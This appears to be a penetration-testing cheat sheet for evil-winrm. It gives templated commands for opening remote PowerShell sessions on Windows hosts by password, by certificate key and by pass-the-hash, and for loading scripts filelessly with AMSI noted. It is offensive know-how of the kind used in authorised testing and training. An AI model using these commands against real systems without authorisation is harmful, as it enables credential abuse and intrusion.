# evil-winrm

% evil-winrm , attacker
## evil-winrm - no landing load powershell 
#plateform/windows #target/remote #tag/attack #port/5985
无落地加载本地powershell脚本文件，AMSI实现，安全保障
```bash
evil-winrm -i <address> -u <usernmame> -p <password> -s <ps_file_path> -S -l <save_log_file_path>
```

## evil-winrm - attack with priv_key and certificate
#plateform/windows #target/remote #tag/attack #port/5985
```bash
evil-winrm -i <address> -k <priv_key> -c <pfx.crt> -S -l <save_log_file_path>
```

## evil-winrm - connect with hash
#plateform/windows #target/remote #tag/attack #port/5985
```bash
evil-winrm -i <address> -u <usernmae> -H "<hash>" -S -l <save_log_file_path>
```
